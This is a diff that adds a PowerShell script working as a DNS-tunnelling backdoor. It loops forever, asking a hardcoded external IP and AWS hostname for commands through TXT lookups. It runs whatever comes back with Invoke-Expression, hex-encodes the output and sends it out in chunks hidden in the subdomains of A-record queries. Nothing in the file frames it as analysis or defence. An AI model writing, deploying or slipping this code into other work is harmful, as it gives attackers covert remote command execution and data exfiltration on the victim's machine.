@@ -1,0 +1,36 @@
+$ip = "54.169.42.247";
+$url = "ec2-54-169-42-247.ap-southeast-1.compute.amazonaws.com.";
+function funny($cmd) {
+$c = iex $cmd 2>&1 | Out-String;
+$u = [system.Text.Encoding]::UTF8.GetBytes($c);
+$string = [System.BitConverter]::ToString($u);
+$string = $string -replace '-','';
+$len = $string.Length;
+$split = 50;
+$repeat=[Math]::Floor($len/$split);
+$remainder=$len%$split;
+if($remainder){ $repeatr = $repeat+1};
+$rnd = Get-Random;$ur = $rnd.ToString()+".CMDC"+$repeatr.ToString()+"."+$url;
+$q = nslookup -querytype=A $ur $ip;
+for($i=0;$i-lt$repeat;$i++){
+    $str = $string.Substring($i*$Split,$Split);
+    $rnd = Get-Random;$ur1 = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
+    $q = nslookup -querytype=A $ur1 $ip;
+};
+if($remainder){
+    $str = $string.Substring($len-$remainder);
+    $i = $i +1
+    $rnd = Get-Random;$ur2 = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
+    $q = nslookup -querytype=A $ur2 $ip;
+};
+$rnd = Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s $ip;
+};
+while (1){
+   Start-Sleep -s 3
+   $rnd = Get-Random;$u = $rnd.ToString()+"."+$url
+   $txt = nslookup -querytype=TXT $u $ip | Out-String
+   $txt = $txt.split("`n") | %{$_.split('"')[1]} | Out-String
+   if ($txt -match 'NoCMD'){continue}
+   elseif ($txt -match 'exit'){Exit}
+   else{funny($txt)}
+}   
